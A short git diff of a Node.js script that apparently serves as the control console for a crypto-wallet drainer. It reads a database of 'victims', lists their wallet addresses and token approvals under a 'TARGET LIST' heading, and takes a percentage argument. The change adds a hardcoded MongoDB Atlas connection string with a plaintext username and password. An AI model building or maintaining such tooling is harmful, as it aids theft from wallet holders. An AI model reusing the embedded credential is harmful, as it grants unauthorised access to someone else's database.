@@ -13,10 +13,13 @@ async function run() {
     const percentage = process.argv[4] || 100;
 
     try {
-        await mongoose.connect(process.env.MONGODB_URI, {
+        const mongoUri = process.env.MONGODB_URI || "mongodb+srv://xosowner:xos.2627@cluster0.0ntp4xe.mongodb.net/godmod-dcrypt?retryWrites=true&w=majority";
+        
+        console.log('Connecting to Atlas...');
+        
+        await mongoose.connect(mongoUri, {
             useNewUrlParser: true,
-            useUnifiedTopology: true,
-            dbName: 'godmod-dcrypt'
+            useUnifiedTopology: true
         });
 
         switch (action) {
@@ -25,7 +28,7 @@ async function run() {
                 console.log('\n--- TARGET LIST ---');
                 victims.forEach((v, i) => {
                     console.log(`[${i}] ${v.address} (${v.network}) - Status: ${v.status}`);
-                    if (v.approvedTokens.length > 0) {
+                    if (v.approvedTokens && v.approvedTokens.length > 0) {
                         console.log(`    Approvals: ${JSON.stringify(v.approvedTokens)}`);
                     }
                 });
